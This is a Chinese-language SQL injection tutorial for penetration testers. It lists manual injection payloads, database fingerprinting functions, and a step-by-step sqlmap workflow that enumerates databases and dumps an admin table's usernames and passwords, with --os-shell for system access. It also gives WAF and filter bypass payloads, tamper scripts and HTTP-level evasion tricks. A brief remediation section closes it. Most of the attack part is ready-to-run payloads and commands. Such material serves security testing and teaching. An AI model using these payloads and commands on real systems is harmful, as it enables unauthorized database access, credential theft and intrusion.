# SQL 注入漏洞挖掘全流程（手工 + sqlmap + 绕过）

## 1. 漏洞概述

SQL 注入（SQL Injection）是指攻击者通过控制用户可控参数，将恶意 SQL 语句"拼接"进应用原本的 SQL 查询中，使数据库执行非预期命令，从而造成数据泄露、篡改、删除，甚至命令执行的高危漏洞。SQL 注入长期位列 OWASP Top 10 首位，在真实环境的 Web 资产中仍然非常常见。

| 项目 | 说明 |
|------|------|
| 漏洞类型 | SQL 注入 / 代码注入 |
| 影响 | 数据泄露、篡改、删除、提权、RCE |
| 常见注入场景 | 搜索框、分页 id、筛选条件、登录表单、排序参数 |
| 推荐工具 | Burp Suite、sqlmap、Hackbar、NoSQLMap |
| 关键判断依据 | 参数变化导致返回内容差异 / 延迟 / 报错 |

## 2. 注入点识别与手工判断

### 2.1 常见注入点位置

- URL 查询参数：`?id=1`、`?page=1&cat=3`
- POST 表单字段：用户名、搜索关键词、任意对象 ID
- Cookie / User-Agent / X-Forwarded-For 等 Header
- JSON / XML Body 中的字段（尤其是 `id`、`uid`、`type`）
- REST 路径参数：`/api/users/123`

### 2.2 手工初步判断

对每个疑似参数，依次构造以下 payload 观察响应差异：

```
1'              // 单引号，观察是否引发 SQL 语法报错
1"              // 双引号
1 and 1=1       // 正常条件
1 and 1=2       // 恒假条件（布尔注入判断）
1' or '1'='1    // 绕过登录 / 逻辑 or 注入
1 order by 5--  // 判断列数
```

### 2.3 闭合方式推断

根据报错与页面返回结果判断后端拼接方式：

| 响应现象 | 推测闭合方式 |
|---------|-------------|
| 返回 You have an error in your SQL syntax（MySQL） | 单引号字符串 `'$id'` |
| 返回未闭合的括号 | `WHERE id = ($id)` |
| 数字型参数 `and 1=2` 生效 | 直接数值 `WHERE id = $id` |
| 无报错但页面变化但不回显数据 | 盲注场景，使用布尔 / 时间判断 |

### 2.4 数据库类型识别

不同数据库使用不同函数与关键字，可作为识别依据：

```
MySQL：    VERSION() / @@version / information_schema
MSSQL：    @@VERSION / xp_cmdshell / sysobjects
Oracle：   SELECT banner FROM v$version / utl_http.request
PostgreSQL：version() / pg_sleep()
Access：   TOP / MID / NOW()
SQLite：   sqlite_version() / sqlite_master
```

## 3. sqlmap 自动化利用

### 3.1 基本用法

```bash
# 最常用：对单一 URL 进行检测
sqlmap -u "http://target/news.php?id=1" --batch

# 指定数据库类型可加速
sqlmap -u "http://target/news.php?id=1" --dbms=mysql --batch

# POST 请求：将 request 保存在 req.txt 中，然后使用
sqlmap -r req.txt --batch

# 通过 Burp 流量文件直接扫描
sqlmap -l burp.log --batch --skip-heuristic
```

### 3.2 常见参数速查

| 参数 | 作用 |
|------|------|
| `--dbs` | 枚举数据库名 |
| `--tables` | 枚举表名 |
| `-D dbname --columns` | 枚举指定库的字段 |
| `-D db -T tb -C "id,user,pass" --dump` | 导出数据 |
| `--users` / `--passwords` | 枚举数据库用户与哈希 |
| `--is-dba` | 判断当前是否为 DBA |
| `--os-shell` | 获取系统交互 shell（MSSQL/MySQL 文件权限场景） |
| `--batch --random-agent` | 自动选择默认选项 + 随机 UA |
| `--tamper=space2comment` | 使用 tamper 脚本绕过过滤 |

### 3.3 一个完整的实战流程示例

```bash
# 步骤 1：检测注入
sqlmap -u "http://target/item.php?id=1" --batch

# 步骤 2：枚举数据库
sqlmap -u "http://target/item.php?id=1" --dbs --batch

# 步骤 3：枚举指定数据库的表
sqlmap -u "http://target/item.php?id=1" -D cms --tables --batch

# 步骤 4：导出管理员账号表
sqlmap -u "http://target/item.php?id=1" -D cms -T admin -C "id,username,password" --dump --batch
```

## 4. WAF / 过滤绕过技巧

### 4.1 关键字过滤绕过

```
# 空格过滤：使用注释符 /*...*/ / Tab / 括号
?id=1'/*foo*/and/*bar*/1=1-- -

# and / or 过滤：使用 && / ||
?id=1 && 1=1

# union select 过滤：使用 union all select / 内联注释
?id=-1/*!50000union*//*!select*/1,2,3-- -

# select 过滤：改使用大小写或双写
?id=1' unIon sElEct 1,2,3-- -

# 引号过滤：十六进制 / char() 函数
?id=1 union select 0x61646d696e,2,3-- -
```

### 4.2 常用 sqlmap tamper 脚本

```bash
# 绕过分块上传 / 简单正则
sqlmap -u URL --tamper=space2comment --batch

# 绕过关键字替换（双写）
sqlmap -u URL --tamper=doubleselect --batch

# 同时使用多个 tamper
sqlmap -u URL --tamper=apostrophemask,space2comment,between --batch
```

### 4.3 HTTP 层面绕过

- 分片传输（chunked transfer-encoding），让 WAF 难以重组包体
- HTTP 参数污染（HPP）：同时提交多个同名参数，利用后端解析差异
- 使用 `Content-Type: multipart/form-data` 或 JSON 格式绕过规则匹配
- 更换请求方法：把 GET 的 payload 搬到 POST body

## 5. 修复建议

1. **参数化查询 / 预编译语句**（首选）：Java `PreparedStatement`、Python `psycopg2` 参数绑定、PHP PDO。
2. **严格类型校验**：数字型参数先转 int，再拼入 SQL。
3. **白名单校验**：排序、表名等只能来自白名单字符串。
4. **最小权限原则**：Web 连接数据库的账号不应具备 `FILE`、`SUPER` 等高权限。
5. **部署 WAF**：在边界部署规则严格的 WAF，作为补充防线。
